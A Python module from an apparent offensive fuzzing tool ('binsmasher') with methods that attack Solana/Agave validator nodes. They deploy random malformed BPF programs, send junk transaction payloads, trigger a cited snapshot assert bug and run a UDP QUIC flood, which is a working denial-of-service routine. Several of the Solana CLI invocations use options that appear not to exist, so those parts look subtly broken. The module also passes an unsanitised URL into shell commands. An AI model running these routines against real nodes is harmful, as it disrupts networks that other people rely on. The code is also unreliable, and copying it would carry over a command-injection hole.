"""Solana / Agave SVM fuzzing and exploit methods for Fuzzer."""
import os
import random
import struct
import subprocess
import logging
from pathlib import Path

log = logging.getLogger("binsmasher")


class SolanaMixin:
    """Methods: fuzz_bpf, exploit_deser, dos_quic, exploit_snapshot_assert."""

    def fuzz_bpf(self, rpc_url, num_attempts=10):
        log.info(f"BPF/SVM fuzzing via {rpc_url}…")
        success = 0
        for i in range(num_attempts):
            elf_header = (b"\x7fELF" + b"\x02\x01\x01" + b"\x00" * 9
                          + struct.pack("<H", 0x0002) + struct.pack("<H", 0x00f7)
                          + struct.pack("<I", 1) + os.urandom(8 * 5))
            payload = elf_header + os.urandom(random.randint(64, 512))
            path = f"fuzz_bpf_{i:03d}.so"
            Path(path).write_bytes(payload)
            cmd = f"solana program deploy --url {rpc_url} {path} 2>&1"
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
                log.debug(f"  BPF {i}: {out[:120]}")
                if "panic" in out.lower() or "error" in out.lower():
                    log.warning(f"  Interesting at attempt {i}")
                success += 1
            except FileNotFoundError:
                log.error("solana CLI not installed")
                return False
            except Exception as e:
                log.debug(f"  BPF {i}: {e}")
        log.info(f"BPF fuzzing done: {success}/{num_attempts}")
        return True

    def exploit_deser(self, rpc_url):
        import base64
        log.info("Solana deserialization exploit…")
        payloads = [os.urandom(200), b"\xff" * 200, b"\x00" * 200,
                    struct.pack("<QQQ", 0xDEADBEEF, 0xCAFEBABE, 0xBAADF00D) * 8]
        for i, raw in enumerate(payloads):
            b64 = base64.b64encode(raw).decode()
            cmd = (f"solana transfer --url {rpc_url} --from /dev/stdin "
                   f"11111111111111111111111111111112 0.000001 "
                   f"--tx-data {b64} --allow-unfunded-recipient 2>&1 || true")
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
                log.debug(f"Deser {i}: {out[:160]}")
                if "panic" in out.lower():
                    log.warning(f"Panic on deser payload {i}")
            except Exception as e:
                log.debug(f"Deser {i}: {e}")
        return True

    def dos_quic(self, num_packets=2000):
        import socket
        log.info(f"QUIC DoS → {self.host}:{self.port} ({num_packets} pkts)…")
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)
            addr = (self.host, self.port)
            for _ in range(num_packets):
                pkt = bytearray()
                pkt.append(0xC0 | random.randint(0, 3))
                pkt += struct.pack(">I", 1)
                pkt.append(8)
                pkt += os.urandom(8)
                pkt.append(0)
                pkt += os.urandom(random.randint(16, 1200))
                sock.sendto(bytes(pkt), addr)
                sent += 1
            sock.close()
            log.info(f"QUIC DoS: {sent} packets sent")
            return True
        except Exception as e:
            log.error(f"QUIC DoS: {e}")
            return False

    def exploit_snapshot_assert(self, rpc_url):
        log.info("Snapshot assert trigger (Agave #6295)…")
        for slot in (0, 1, 10, 2 ** 32 - 1, 2 ** 64 - 1):
            cmd = f"solana snapshot --url {rpc_url} --slot {slot} 2>&1 || true"
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
                log.debug(f"  slot={slot}: {out[:160]}")
                if "assert" in out.lower() or "panic" in out.lower():
                    log.warning(f"  Assert/panic at slot={slot}!")
            except Exception as e:
                log.debug(f"  slot={slot}: {e}")
        return True
